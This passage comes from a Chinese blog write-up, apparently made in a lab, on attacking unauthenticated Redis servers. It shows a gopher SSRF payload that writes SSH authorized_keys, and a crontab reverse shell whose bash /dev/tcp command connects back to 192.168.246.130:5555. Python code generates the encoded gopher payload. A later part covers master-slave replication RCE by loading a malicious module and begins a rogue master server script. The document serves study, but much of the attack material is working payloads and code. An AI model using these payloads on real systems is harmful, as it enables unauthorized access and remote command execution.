zqRRCEBH8XLbaihKVSk8OA3KYoaMv3oAD1QbI98FuEzoFy6gaYJd0XAP0TBGFExgmMSUCw5t2k79C7LH2sLFbn6hGQqjErLHky7qDoVpEX0Ohv1yh4EcoAAcLeagUQwg%<span class="hljs-number">252</span>BjmcuusQejrd8SsRmQtDWhw2qFCuoYkEaKyJBixb5KxZAFoSJJ4Te
GdbRaAcTuTkVLzBgJXDCA5n2hM%<span class="hljs-number">253</span>D%<span class="hljs-number">2520</span>root%<span class="hljs-number">2540</span>kali%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A4%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25246</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aconfig%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aset%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Adir%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252411</span>%<span class="hljs-number">25</span>
<span class="hljs-number">0</span>D%<span class="hljs-number">250</span>A/root/.ssh/%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A4%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25246</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aconfig%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25243</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aset%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252410</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Adbfilename%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252415</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Aauthorized_keys%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">252</span>A1%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">25244</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Asave%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229145722322.png" alt="image-20231229145722322"></p>
<p>成功写入，接下来我们远程连接看看</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229145749212.png" alt="image-20231229145749212"></p>
<p>成功实现免密登录</p>
<h2 id="利用contrab计划任务反弹shell">利用contrab计划任务反弹shell</h2>
<p>这个方法只能<code>Centos</code>上使用，<code>Ubuntu上行不通</code>，原因如下：</p>
<ol>
<li>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行</li>
<li>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</li>
</ol>
<p>由于系统的不同，crontrab定时文件位置也会不同</p>
<pre><code class="hljs plaintext">Centos的定时任务文件在`/var/spool/cron/&lt;username&gt;`
Ubuntu定时任务文件在`/var/spool/cron/crontabs/&lt;username&gt;`</code></pre>
<p>Centos和Ubuntu均存在的（需要root权限）<code>/etc/crontab</code> PS：高版本的redis默认启动是<code>redis</code>权限，故写这个文件是行不通的</p>
<h3 id="构造payload">构造payload</h3>
<p>这里我再复习一波bash反弹命令的原理吧：</p>
<pre><code class="hljs sh">/bin/bash -i &gt;&amp; /dev/tcp/[ip]/[端口] 0&gt;&amp;1</code></pre>
<p>/bin/bash -i 表示的是调用bash命令的交互模式，并将交互模式重定向到 /dev/tcp/[ip]/[端口] 中。这里我们将ip和端口改为我们攻击机的地址和监听端口。</p>
<p>重定向时加入一个描述符 &amp;，表示直接作为数据流输入。不加 &amp; 时，重定向默认是输出到文件里的。</p>
<p>/dev/tcp/ip地址/端口号 是linux下的特殊文件，表示对这个地址端口进行tcp连接</p>
<p>这里我们设置成攻击机监听的地址</p>
<p>最后面的 0&gt;&amp;1 。此时攻击机和靶机已经建立好了连接，当攻击机进行输入时，就是这里的 0（标准输入）</p>
<p>通过重定向符，重定向到 1（标准输出）中，由于是作为 /bin/bash 的标准输入，所以就执行了系统命令了。</p>
<p>接下来开始写入定时任务，构造redis的命令如下：</p>
<pre><code class="hljs php">flushall
set <span class="hljs-number">1</span> <span class="hljs-string">'\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.246.130/5555 0&gt;&amp;1\n\n'</span>
config set dir /<span class="hljs-keyword">var</span>/spool/cron/
config set dbfilename root
save</code></pre>
<p>转化为redis RESP协议的格式，修改上述脚本即可</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> urllib
protocol=<span class="hljs-string">"gopher://"</span>
ip=<span class="hljs-string">"127.0.0.1"</span>
port=<span class="hljs-string">"6379"</span>
shell=<span class="hljs-string">"\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/192.168.246.130/5555 0&gt;&amp;1\n\n"</span>
filename=<span class="hljs-string">"root"</span>
path=<span class="hljs-string">"/var/spool/cron"</span>
passwd=<span class="hljs-string">""</span>
cmd=[<span class="hljs-string">"flushall"</span>,
     <span class="hljs-string">"set 1 {}"</span>.<span class="hljs-built_in">format</span>(shell.replace(<span class="hljs-string">" "</span>,<span class="hljs-string">"${IFS}"</span>)),
     <span class="hljs-string">"config set dir {}"</span>.<span class="hljs-built_in">format</span>(path),
     <span class="hljs-string">"config set dbfilename {}"</span>.<span class="hljs-built_in">format</span>(filename),
     <span class="hljs-string">"save"</span>
     ]
<span class="hljs-keyword">if</span> passwd:
    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">"AUTH {}"</span>.<span class="hljs-built_in">format</span>(passwd))
payload=protocol+ip+<span class="hljs-string">":"</span>+port+<span class="hljs-string">"/_"</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">redis_format</span>(<span class="hljs-params">arr</span>):
    CRLF=<span class="hljs-string">"\r\n"</span>
    redis_arr = arr.split(<span class="hljs-string">" "</span>)
    cmd=<span class="hljs-string">""</span>
    cmd+=<span class="hljs-string">"*"</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:
        cmd+=CRLF+<span class="hljs-string">"$"</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>((x.replace(<span class="hljs-string">"${IFS}"</span>,<span class="hljs-string">" "</span>))))+CRLF+x.replace(<span class="hljs-string">"${IFS}"</span>,<span class="hljs-string">" "</span>)
    cmd+=CRLF
    <span class="hljs-keyword">return</span> cmd

<span class="hljs-keyword">if</span> __name__==<span class="hljs-string">"__main__"</span>:
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:
        payload += urllib.quote(redis_format(x))
    <span class="hljs-built_in">print</span> urllib.quote(payload)</code></pre>
<p>二次编码后的结果如下</p>
<pre><code class="hljs plaintext">gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252461%250D%250A%250A%250A%252A/1
%2520%252A%2520%252A%2520%252A%2520%252A%2520bash%2520-i%2520%253E%2526%2520/dev/tcp/192.168.246.130/5555%25200%253E%25261%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D
%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252415%250D%250A/var/spool/cron%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25244%250D%250Aroot%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A</code></pre>
<p>发送后，看一下靶机是否被成功写入</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229152354736.png" alt="image-20231229152354736"></p>
<p>接着攻击机开启监听，等一会儿即可。如下图成功拿到shell</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229152242287.png" alt="image-20231229152242287"></p>
<p>不过这里也可以用我推荐过的工具</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229152446308.png" alt="image-20231229152446308"></p>
<p>他这里默认监听端口为1234，需要注意一下，同样二次编码后看靶机，如下图成功写入</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229152024436.png" alt="image-20231229152024436"></p>
<p>成功那shell，不过这里这个工具是sh反弹，暂时也不知道这两种方式有何区别</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229151825806.png" alt="image-20231229151825806"></p>
<h1 id="0x05-redis主从复制rce">0x05 Redis主从复制RCE</h1>
<p>这里搞着搞着就到了主从复制了，回想起之前搞这玩意儿弄得心烦，环境一直搞不好，看来是时候解决了~~</p>
<h2 id="介绍">介绍</h2>
<p>redis 4.x/5.x RCE是由<code>LC/BC</code>战队队员<code>Pavel Toporkov</code>在<code>zeronights 2018</code>上提出的基于主从复制的redis rce，演讲的PPT地址为：<a target="_blank" rel="noopener" href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">PPT</a></p>
<h2 id="利用条件">利用条件</h2>
<p>□ 能未授权或者能通过弱口令认证访问到Redis服务器</p>
<p>□ 可动态修改备份文件路径</p>
<p>□ 主从未校验可信服务端</p>
<h2 id="主从复制概念">主从复制概念</h2>
<pre><code class="hljs plaintext">主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。

redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据时就会通过主从复制复制到其它从redis。</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229153219790.png" alt="image-20231229153219790"></p>
<p>这里就跟着师傅搭建主从复制了，属实是不懂唉</p>
<p>建立主从复制，有3种方式：</p>
<ol>
<li>配置文件写入<code>slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></li>
<li>redis-server启动命令后加入 <code>--slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></li>
<li>连接到客户端之后执行：slaveof <code>&lt;master_ip&gt; &lt;master_port&gt;</code></li>
</ol>
<p><strong>PS：建立主从关系只需要在从节点操作就行了，主节点不用任何操作</strong></p>
<p>我们先在同一个机器开两个redis实例，一个端口为6379，一个端口为6380</p>
<p>这里我们在上面搭建的基础上，同一目录下新建redis6380文件，接着将之前已经有的redis目录下的redis.conf配置文件赋值到redis6380文件中，接着修改其中端口为6380即可</p>
<p>可参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/manqishizhizhu/article/details/123772523?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170383537616800182744632%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=170383537616800182744632&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-123772523-null-null.142%5Ev99%5Epc_search_result_base2&amp;utm_term=centos7%E5%BC%80%E5%90%AF%E4%B8%A4%E4%B8%AAredis%E5%AE%9E%E4%BE%8B&amp;spm=1018.2226.3001.4187">Centos7搭建多个Redis实例</a></p>
<pre><code class="hljs sh">redis-server /etc/redis/redis.conf 
redis-server /etc/redis/redis6380.conf <span class="hljs-comment">#这里需要在redis-server服务所在目录下启动，而后面的内容为redis配置文件路径</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229155122022.png" alt="image-20231229155122022"></p>
<p>可以看到均启动成功</p>
<p>我们把master_ip设置为<code>127.0.0.1</code>，master_port为<code>6380</code> --这里这个师傅是将6380所在redis服务器当做主服务器了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229155515379.png" alt="image-20231229155515379"></p>
<p>可以看到在成功设置主从关系之后，我们在6380主服务器上设置某些数据，之后在6379上可以看到数据的同步</p>
<p>如果我们想解除主从关系可以执行<code>SLAVEOF NO ONE</code></p>
<h2 id="redis-module">redis module</h2>
<p>自从Redis4.x之后redis新增了一个模块功能，Redis模块可以使用外部模块扩展Redis功能，以一定的速度实现新的Redis命令，并具有类似于核心内部可以完成的功能。<br>
Redis模块是动态库，可以在启动时或使用<code>MODULE LOAD</code>命令加载到Redis中。</p>
<p>恶意so文件编写：<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK">https://github.com/n0b0dyCN/redis-rogue-server/tree/master/RedisModulesSDK</a></p>
<h2 id="攻击原理">攻击原理</h2>
<p>利用步骤，贴一下PPT上的步骤</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229160136094.png" alt="image-20231229160136094"></p>
<p>slave和master的握手协议过程</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229160148389.png" alt="image-20231229160148389"></p>
<p>图中一些常量说明</p>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> REPL_STATE_CONNECTING 2 <span class="hljs-comment">/* 等待和master连接 */</span></span>
<span class="hljs-comment">/* --- 握手状态开始 --- */</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> REPL_STATE_RECEIVE_PONG 3 <span class="hljs-comment">/* 等待PING返回 */</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> REPL_STATE_SEND_AUTH 4 <span class="hljs-comment">/* 发送认证消息 */</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> REPL_STATE_RECEIVE_AUTH 5 <span class="hljs-comment">/* 等待认证回复 */</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> REPL_STATE_SEND_PORT 6 <span class="hljs-comment">/* 发送REPLCONF信息，主要是当前实例监听端口 */</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> REPL_STATE_RECEIVE_PORT 7 <span class="hljs-comment">/* 等待REPLCONF返回 */</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> REPL_STATE_SEND_CAPA 8 <span class="hljs-comment">/* 发送REPLCONF capa */</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> REPL_STATE_RECEIVE_CAPA 9 <span class="hljs-comment">/* 等待REPLCONF返回 */</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> REPL_STATE_SEND_PSYNC 10 <span class="hljs-comment">/* 发送PSYNC */</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> REPL_STATE_RECEIVE_PSYNC 11 <span class="hljs-comment">/* 等待PSYNC返回 */</span></span>
<span class="hljs-comment">/* --- 握手状态结束 --- */</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> REPL_STATE_TRANSFER 12 <span class="hljs-comment">/* 正在从master接收RDB文件 */</span></span></code></pre>
<p>这里的重点就是利用全量复制将master上的RDB文件同步到slave上，也就是将我们的恶意so文件传输到slave上，从而达到加载恶意so文件达到rce。</p>
<p>那为什么一定是全量复制呢，理由如下，当slave向master发送PSYNC命令之后，一般会得到三种回复：</p>
<ol>
<li>+FULLRESYNC：进行全量复制。</li>
<li>+CONTINUE：进行增量同步。</li>
<li>-ERR：当前master还不支持PSYNC。</li>
</ol>
<h3 id="全量复制的过程">全量复制的过程</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229162001398.png" alt="image-20231229162001398"></p>
<ul>
<li>slave向master发送PSYNC请求，并携带master的runid和offest，如果是第一次连接的话slave不知道master的runid，所以会返回runid为<code>?</code>，offest为<code>-1</code>，<strong>我们来测试以下看看是不是真的如此</strong></li>
</ul>
<p>这里我们先对6379的redis输入slave no one，解除他与6380redis之间的主从关系，接着kali开启监听，在6379上设置kali为redis的主服务器</p>
<p>这里我操作失误了，连接第二次我才搞懂得干嘛。。。似乎就是redis连接你之后，你需要回复指定命令与其进行通信，最后返回master的runid和offest，即：</p>
<pre><code class="hljs plaintext">主服务器需要执行的响应内容如下:

[&gt;] PING – 从服务器探测主服务器是否存活

[&lt;] +PONG  存活响应

[&gt;] REPLCONF – 交换主从节点复制信息

[&lt;] +OK     确认

[&gt;] PSYNC/SYNC – 同步状态以及传输方式

[&lt;] +FULLRESYNC  同步数据</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229163154621.png" alt="image-20231229163154621"></p>
<p>正确的应该是这样</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229163317518.png" alt="image-20231229163317518"></p>
<p>过程是这样的：</p>
<ul>
<li>master验证slave发来的runid是否和自身runid一致，如不一致，则进行全量复制。</li>
<li>master把自己的runid和offset发给slave，slave对master发来的runid和offest进行保存</li>
<li>master进行bgsave，生成RDB文件</li>
<li>master将写好的RDB文件传输给slave，并将缓冲区内的数据传输给slave</li>
<li>slave加载RDB文件和缓冲区数据</li>
</ul>
<h3 id="增量复制部分复制">增量复制（部分复制）</h3>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229163432449.png" alt="image-20231229163432449"></p>
<p>增量复制的过程这里简单带过一下：就是当slave向master要求数据同步时，会发送master的runid和offest，如果runid和slave上的不对应则会进行全量复制，如果相同则进行数据同步，但是不会传输RDB文件</p>
<p>通过了解全量复制和增量复制的过程，我们应该大致知道为什么一定要用全量复制而不用增量复制了。</p>
<p>但是这样我感觉还是欠点什么，因为我认为我没有完全搞懂，又找了几篇文章发现这个解释的很好：</p>
<p>Redis提供了2种不同的持久化方式，RDB方式（在指定的时间间隔内生成数据集的时间点快照）和AOF方式（记录服务器执行的所有写操作命令）.AOF方式备份数据库的文件名默认为appendonly.aof，可以在配置文件中通过修改appendfilename参数进行修改，无法在客户端交互中动态设置appendfilename，而RDB方式备份数据库的文件名默认为dump.rdb，此文件名可以通过客户端交互动态设置dbfilename来更改。</p>
<p>这也说明了我们为何要选择RDB方式了。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229163812136.png" alt="image-20231229163812136"></p>
<p>上图可以看到我们可以任意设置RDB文件名，但对于AOF却不行，而重点如下：</p>
<p>主从复制模式下数据单向从主节点流向从节点，<strong>在从节点首次注册时</strong>，会对主节点数据进行全量复制，复制过程中用offset记录读取的数据大小，以便中断后断点续传。如果从节点初始没有数据，通过主从复制，可以将主节点设置的dbfilename文件全量复制到从节点的dbfilename中，从而实现任意文件上传。</p>
<p>这也就说明了，攻击的时候似乎只能一次成功吗？毕竟如果第二次连接就不是首次注册了。。。</p>
<p>不过原理算是彻底明白了</p>
<h2 id="攻击流程">攻击流程</h2>
<p>第一个就是先配置一个攻击服务器，这个服务器是用于被受害者redis服务器连接的，也就是我们的靶机为从服务器，攻击机为主服务器（而恶意so文件就在我们的攻击机上）</p>
<p>而攻击机在于redis交互的过程中，需要发送如下信息：</p>
<pre><code class="hljs sh">PING 测试连接是否可用
+PONG 告诉slave连接可用
REPLCONF 发送REPLCONF信息，主要是当前实例监听端口
+OK 告诉slave成功接受
REPLCONF 发送REPLCONF capa
+OK 告诉slave成功接受
PSYNC &lt;rundi&gt; &lt;offest&gt; 发送PSYNC</code></pre>
<p>这里样的话才算成功的冒充为了一名合格的redis主服务器</p>
<p>如下图所示：这里我就借用了~~</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229164232337.png" alt="image-20231229164232337"></p>
<p>而此时的redis从服务器需要主动的发送如下信息（实际就是我们操控它发送）</p>
<pre><code class="hljs htaccess">Config set dir ./  设置redis的备份路径为当前目录

Config set dbfilename test.so  修改备份文件名

SLAVEOF host port 设置为对应服务器的从节点

MODULE LOAD ./test.so 加载复制过来的

SLAVEOF no one  关闭主从复制关系(防止脏数据复制)

System.exec ‘command’ 执行命令</code></pre>
<h3 id="任意文件写入">任意文件写入</h3>
<p>这里呢，我是先配置的redis服务对外开放6379端口，ssrf后续再说，这里开启之后呢，我并没有对redis设置登录密码，但同时要设置取消保护模式，同时对于监听本地127.0.0.1的那一行需要注释掉</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229215205554.png" alt="image-20231229215205554"></p>
<p>接下来我们kali连接测试一下，如下图可以看到能成功连接</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20231229220359116.png" alt="image-20231229220359116"></p>
<p>这里的话先连接上redis-server，之后设置备份文件目录，以及备份文件名，然后执行slaveof使其成为我们恶意服务的从redis，恶意 master 在接收到 redis-server 的 <code>PSYNC</code> 命令后，返回 <code>FULLRESYNC</code> 命令，并将 payload 紧跟着发送。最终 payload 被写到 redis-server 的 <code>/var/www/html/exp.txt</code> 当中</p>
<p>恶意master如下</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> argparse
<span class="hljs-keyword">import</span> socketserver
<span class="hljs-keyword">import</span> logging
<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">import</span> time

logging.basicConfig(stream=sys.stdout, level=logging.INFO, <span class="hljs-built_in">format</span>=<span class="hljs-string">'&gt;&gt; %(message)s'</span>)

DELIMITER = <span class="hljs-string">b"\r\n"</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">RoguoHandler</span>(socketserver.BaseRequestHandler):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">self, data</span>):
        <span class="hljs-keyword">if</span> data.startswith(<span class="hljs-string">b'*'</span>):
            <span class="hljs-keyword">return</span> data.strip().split(DELIMITER)[<span class="hljs-number">2</span>::<span class="hljs-number">2</span>]
        <span class="hljs-keyword">if</span> data.startswith(<span class="hljs-string">b'$'</span>):
            <span class="hljs-keyword">return</span> data.split(DELIMITER, <span class="hljs-number">2</span>)[<span class="hljs-number">1</span>]
